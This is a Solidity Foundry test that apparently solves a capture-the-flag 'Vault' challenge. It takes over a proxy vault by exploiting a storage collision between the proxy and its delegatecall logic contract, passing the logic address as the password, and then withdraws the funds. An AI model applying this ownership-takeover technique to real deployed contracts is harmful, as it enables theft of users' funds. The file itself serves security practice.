// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
// import "forge-std/console2.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code..
        bytes32 password = vm.load(address(logic), bytes32(uint256(1)));
        VaultLogic(address(vault)).changeOwner(bytes32(uint256(uint160(address(logic)))), palyer);
        vault.openWithdraw();

        vm.stopPrank();
        vm.prank(owner);
        vault.withdraw();

        require(vault.isSolve(), "solved");
    }

}
